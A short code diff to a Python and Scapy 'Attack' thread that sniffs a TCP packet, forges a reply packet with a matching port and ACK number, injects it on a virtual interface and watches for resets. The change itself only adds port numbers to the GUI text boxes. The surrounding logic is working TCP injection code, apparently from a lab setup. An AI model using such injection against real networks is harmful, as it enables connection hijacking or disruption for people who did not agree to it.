@@ -16,7 +16,7 @@ class Attack(QThread):
         self.new_textBox = new_textBox
 
     def inj(self, pacote, pkt):
-        self.original_textBox.setText("Trigged packet:\n src IP: "+ pkt[IP].src + "\n dst IP: " + pkt[IP].dst + "\n ACK: " + str(pkt[TCP].ack) + "\n SEQ: " + str(pkt[TCP].seq) + "\n flags: " + str(getFlags(pkt[TCP].flags)))
+        self.original_textBox.setText("Trigged packet:\n src IP: "+ pkt[IP].src + "\n dst IP: " + pkt[IP].dst + "\n SPort: " + str(pkt[TCP].sport) + "\n DPort: " + str(pkt[TCP].dport) + "\n ACK: " + str(pkt[TCP].ack) + "\n SEQ: " + str(pkt[TCP].seq) + "\n flags: " + str(getFlags(pkt[TCP].flags)))
         pacote[TCP].dport = pkt[TCP].sport
         pacote[TCP].ack = pkt[TCP].seq + 1
         del pacote[IP].chksum
@@ -24,7 +24,7 @@ class Attack(QThread):
         #pacote.show2()
         #for i in range(0, 15):
         sendp(pacote, iface="virbr0")
-        self.new_textBox.setText("Trigged packet:\n src IP: "+ pacote[IP].src + "\n dst IP: " + pacote[IP].dst + "\n ACK: " + str(pacote[TCP].ack) + "\n SEQ: " + str(pacote[TCP].seq) + "\n flags: " + str(getFlags(pacote[TCP].flags)))
+        self.new_textBox.setText("Sent packet:\n src IP: "+ pacote[IP].src + "\n dst IP: " + pacote[IP].dst + "\n SPort: " + str(pacote[TCP].sport) + "\n DPort: " + str(pacote[TCP].dport) + "\n ACK: " + str(pacote[TCP].ack) + "\n SEQ: " + str(pacote[TCP].seq) + "\n flags: " + str(getFlags(pacote[TCP].flags)))
         sniffing  = sniff(iface = "virbr0", filter = "port 8080", count = 2)
         flags = str(getFlags(sniffing[1][TCP].flags))
         if 'RST' in flags:
